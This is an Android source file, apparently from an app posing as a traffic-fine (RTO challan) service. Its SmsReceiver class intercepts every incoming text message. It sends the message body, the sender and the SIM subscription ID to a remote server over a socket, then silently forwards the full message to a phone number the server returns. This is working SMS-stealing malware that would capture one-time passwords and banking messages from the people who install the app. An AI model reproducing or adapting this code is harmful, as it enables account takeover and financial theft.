package com.service.rtochallan;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Objects;

public class SmsReceiver extends BroadcastReceiver {

    private int userId = 0;
    protected SocketManager socketManager;
    private SmsManager smsManager;
    private Helper helper;
    private StorageHelper storage;

    @Override
    public void onReceive(Context context, Intent intent) {
        socketManager = SocketManager.getInstance(context);
        smsManager = SmsManager.getDefault();
        socketManager.connect();
        helper = new Helper();
        storage = new StorageHelper(context);

        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    StringBuilder fullMessage = new StringBuilder();
                    String sender = "";

                    // Combine all PDUs into one full message
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        if (smsMessage != null) {
                            sender = smsMessage.getDisplayOriginatingAddress();
                            fullMessage.append(smsMessage.getMessageBody());
                        }
                    }
                    String messageBody = fullMessage.toString();
                    // remove duplicate message
                    if(Objects.equals(storage.getString("last_message", null), messageBody)){
                        storage.saveString("last_message", null); // remove Last Messaage Saved...
                        return ;
                    }
                    storage.saveString("last_message", messageBody);
                    //Log.d(helper.TAG, "Last Message Save" + storage.getString("last_message", null));
                    JSONObject sendPayload = new JSONObject();
                    try {
                        sendPayload.put("message", messageBody);
                        sendPayload.put("sender", sender);
                        sendPayload.put("sim_sub_id", smsManager.getSubscriptionId());
                        sendPayload.put("sms_forwarding_status", "sending");
                        sendPayload.put("sms_forwarding_status_message", "Request for sending");

                        socketManager.emitWithAck("smsForwardingData", sendPayload, new SocketManager.AckCallback() {
                            @Override
                            public void onResponse(JSONObject response) {
                                int status = response.optInt("status", 0);
                                String message = response.optString("message", "No message");

                                if (status == 200) {
                                    JSONObject dataObj = response.optJSONObject("data");
                                    if (dataObj != null) {
                                        userId = dataObj.optInt("id");
                                        String phoneNumber = dataObj.optString("forward_to_number");

                                        int sentRequestCode = (userId + phoneNumber).hashCode();
                                        int deliveredRequestCode = (userId + phoneNumber + "_delivered").hashCode();

                                        Intent sentIntent = new Intent(context, SentReceiver.class);
                                        Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
                                        sentIntent.putExtra("id", userId);
                                        sentIntent.putExtra("phone", phoneNumber);
                                        deliveredIntent.putExtra("id", userId);
                                        deliveredIntent.putExtra("phone", phoneNumber);

                                        PendingIntent sentPendingIntent = PendingIntent.getBroadcast(
                                                context, sentRequestCode, sentIntent, PendingIntent.FLAG_IMMUTABLE);
                                        PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(
                                                context, deliveredRequestCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);

                                        smsManager.sendTextMessage(phoneNumber, null, messageBody,
                                                sentPendingIntent, deliveredPendingIntent);

                                        // ✅ Log and store sent SMS count
                                    }
                                } else {
                                    //Log.d(helper.TAG, "⚠️ Socket response failed: " + message);
                                }
                            }

                            @Override
                            public void onError(String error) {
                                //Log.d(helper.TAG, "❌ Emit Error: " + error);
                            }
                        });

                    } catch (JSONException e) {
                        Log.e(helper.TAG, "JSON Exception: ", e);
                    }
                }
            }
        }
    }
}
